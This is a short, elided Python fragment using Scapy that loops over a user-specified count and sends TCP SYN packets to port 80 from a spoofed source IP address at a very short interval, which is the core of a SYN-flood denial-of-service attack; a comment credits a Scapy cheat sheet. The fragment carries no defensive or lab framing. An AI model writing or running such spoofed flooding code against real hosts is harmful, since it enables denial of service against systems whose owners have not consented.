...
for i in range(int(nbofpkts)): #send a number of packets the user specifies
    ...
    sendp(IP(src=spoofedip, dst=dest) / TCP(sport=sport, dport=80, flags='S'), inter=0.0001) #source is scapy's tutorial on how to create packets with different layers https://weril.me/wp-content/uploads/2019/01/ScapyCheatSheet_v0.2.pdf
